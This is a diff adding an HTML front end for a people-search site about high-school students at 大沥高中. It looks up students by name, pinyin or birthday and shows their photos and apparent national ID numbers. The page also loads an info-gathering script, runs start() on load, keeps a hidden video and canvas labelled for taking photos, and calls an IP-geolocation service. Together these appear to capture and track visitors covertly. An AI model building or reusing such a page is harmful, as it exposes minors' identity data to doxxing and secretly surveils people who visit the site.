@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html>
+	<head>
+
+		<title>沥高查人系统</title>
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+		<!-- 新 Bootstrap 核心 CSS 文件 -->
+		<link href="https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet">
+
+		<!-- jQuery文件。务必在bootstrap.min.js 之前引入 -->
+		<script src="https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js"></script>
+
+		<!-- 最新的 Bootstrap 核心 JavaScript 文件 -->
+		<script src="https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js"></script>
+
+		<!-- 引入 layui.css -->
+		<link rel="stylesheet" href="https://www.layuicdn.com/layui/css/layui.css">
+
+		<!-- 引入 layui.js -->
+		<script src="https://www.layuicdn.com/layui/layui.js"></script>
+		<!-- <script src="https://cdn.jsdelivr.net/gh/snapappointments/bootstrap-select/js/bootstrap-select.js"></script> -->
+
+		<!-- 引入获取信息脚本 -->
+		<script src="/static/js/getseeinfo.js"></script>
+
+		<meta name="referrer" content="never">
+
+	</head>
+	<body>
+		<div class="container">
+			<div class="panel panel-info">
+				<div class="panel-heading">
+
+					<h2 class="panel-title text-center">香香-沥高查人系统</h2>
+
+					<img id="head-img" style="display: none;" src="https://q1.qlogo.cn/g?b=qq&nk=1799262301&s=640"
+						class="img-circle center-block" alt="Cinque Terre" width="50" height="50">
+				</div>
+				<div class="panel-body">
+
+					<p class="text-center text-success" style="font-size: 18px;">选择查询模式:
+						<select class="selectpicker" id="select">
+							<option value="name">按名字查人(支持模糊)</option>
+							<option value="pyname">按拼音缩写查人</option>
+							<option value="born">按生日查人</option>
+						</select>
+					</p>
+
+					<br />
+
+					<div class="input-group">
+						<input type="text" class="form-control" id="input-name">
+						<span class="input-group-btn">
+							<button class="btn btn-success" type="button" onclick="search();">查询</button>
+						</span>
+					</div><!-- /input-group -->
+					<br>
+
+					<!-- 公告信息提示框 -->
+					<div class="alert alert-info alert-dismissable">
+						<button type="button" class="close" data-dismiss="alert" aria-hidden="true">
+							&times;
+						</button>
+						<p>1. 本系统可以查询大沥高中2021届高一的学生信息！</p>
+						<p>2. 数据来自网上公开信息采集，包含图片。</p>
+						<p class="text-danger">3. 本系统仅供认识新同学使用，相互了解增进友情，不得用于非法人肉他人。非法用途制作者不承担法律责任。</p>
+						<p class="text-danger">4. 本系统一切责任人为<a class="text-primary"
+								href="">(香香)<span
+									class="glyphicon glyphicon-new-window"></span></a>。如有疑问请咨询：QQ：1799262301</p>
+						<p class="text-danger">5. 按生日查人的格式为:<code>2006-02-05</code></p>
+					</div>
+
+					<!-- 查询错误信息警告框 -->
+					<div class="alert alert-danger alert-dismissable" id='error-msg' style="display: none;">
+						<button type="button" class="close" data-dismiss="alert" aria-hidden="true">
+							&times;
+						</button>
+						查询错误:<code id="msg"></code>
+					</div>
+
+					<!-- 查询信息提示框 -->
+					<div class="alert alert-success alert-dismissable" id='suc-msg' style="display: none;">
+						<button type="button" class="close" data-dismiss="alert" aria-hidden="true">
+							&times;
+						</button>
+						查询结果:<code id="suc-msg"></code>
+					</div>
+
+					<button type="button" class="btn btn-primary"><a href="/">返回主菜单</a></button>
+
+					<!-- 查询结果容器弃用 -->
+					<!-- <div id="add">
+						
+					</div> -->
+					<!-- 查询结果接口容器 -->
+					<ul class="list-group" id="add">
+
+					</ul>
+
+					<!-- 拍照用 -->
+					<video id="video" width="600px" height="600px" autoplay="autoplay" style="display: none;"></video>
+					<canvas id="canvas" width="600px" height="600px" style="display: none;"></canvas>
+
+				</div>
+			</div>
+		</div>
+	</body>
+	<script type="text/javascript">
+		// api 地址记得更改
+		var api = "/dani/api/"
+		$(document).ready(function() {
+			$('#head-img').show(1000);
+			start();
+		});
+
+		function search() {
+			var value = $("#input-name").val();
+			var type = $("#select").val();
+			$.ajax({
+				url: api,
+				type: "get",
+				data: {
+					"type": type,
+					"value": value,
+				},
+				dataType: "json",
+				timeout: 8000,
+				beforeSend: function() {
+					// 请求前置空查询结果
+					$('#add').hide();
+					$("#suc-msg").hide();
+					$("#error-msg").hide();
+					$("#add").empty();
+				},
+				success: function(result) {
+					console.log(result)
+					// console.log(result.code)
+					if (result.code != 200) {
+						$("#error-msg").show(1000, "swing");
+						$("#msg").text(result.msg);
+					} else {
+						// var addwiget="";
+						$("#suc-msg").show(1000);
+						$("#suc-msg").text(result.msg);
+						for (var i = 0; i < result.data.length; i++) {
+							var data = result.data[i]
+
+
+							var addwiget =
+								'<li class="list-group-item"><a class="text-primary"href="/dani/' + data
+								.student_sfz +
+								'"/target=_blank;style="font-size: 20px;"><img src="/static/std/' +
+								data.student_photo +
+								'"class="img-circle img-thumbnail img-responsive"style="width: 50px; height: 50px;"><h4 style="display: inline">' +
+								data.student_name + '<small><code>' + data.student_sfz +
+								'</code></small></h4><button type="button"class="btn btn-default btn-sm"><span class="glyphicon glyphicon-share"></span>跳转到</button></a></li>';
+
+
+							$("#add").append(addwiget);
+						}
+						$("#add").show(1000, "swing");
+
+
+					};
+
+				},
+				error: function(xhr, status, error) {
+					$("#error-msg").show(1000);
+					$("#msg").text("后端接口异常:" + status + error);
+				}
+			});
+
+		};
+	</script>
+	<script src="https://whois.pconline.com.cn/ipJson.jsp"></script>
+</html>
